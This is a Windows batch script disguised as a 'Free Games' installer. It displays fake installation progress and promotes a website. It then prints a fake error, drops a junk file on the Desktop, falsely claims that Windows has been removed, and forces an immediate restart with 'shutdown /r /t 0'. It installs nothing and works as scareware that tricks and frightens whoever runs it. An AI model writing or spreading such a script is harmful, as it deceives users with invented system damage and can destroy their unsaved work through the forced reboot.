color a
@echo off
cls
title Free Games
echo Welcome to Free Games Installer!
cls
timeout /t 2 >nul

for %%i in (10 20 30 40 50 60 70 80 90 95 100) do (
    echo Installing game files... %%i%% complete
    timeout /t 1 >nul
)

echo Please wait. For fun and freebies, go to www.princessneedle.gg
timeout /t 2 >nul
cls

echo ERROR: Corrupted installation detected!
timeout /t 3 >nul
cls

echo wjj > "%USERPROFILE%\Desktop\princessneedle.wjj"

echo Installation failed. System unstable.
echo Restoring files...
timeout /t 5 >nul
cls
echo Files didn't restore, and Windows has been removed. Install Windows immediately.
timeout /t 3 >nul
cls
shutdown /r /t 0